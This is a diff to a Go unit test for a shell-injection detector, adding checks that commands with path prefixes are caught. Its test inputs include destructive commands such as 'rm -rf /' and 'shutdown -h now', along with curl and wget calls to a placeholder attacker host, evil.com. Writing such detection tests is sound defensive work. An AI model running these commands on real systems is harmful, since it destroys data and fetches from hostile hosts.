@@ -2,6 +2,8 @@ package shellinjection
 
 import (
 	"testing"
+
+	"github.com/stretchr/testify/assert"
 )
 
 func TestContainsShellSyntax(t *testing.T) {
@@ -111,5 +113,12 @@ func TestContainsShellSyntax(t *testing.T) {
 		checkSep("ls\frm", "rm")
 		checkSep("echo test\frm -rf /", "rm")
 		checkSep("rm\fls", "rm")
+	})
+
+	t.Run("it detects basename when command has path prefix", func(t *testing.T) {
+		assert.True(t, containsShellSyntax("/bin/rm -rf /tmp/x", "rm"))
+		assert.True(t, containsShellSyntax("/usr/bin/curl http://evil.com", "curl"))
+		assert.True(t, containsShellSyntax("/sbin/shutdown -h now", "shutdown"))
+		assert.True(t, containsShellSyntax("/usr/local/bin/wget http://evil.com", "wget"))
 	})
 }
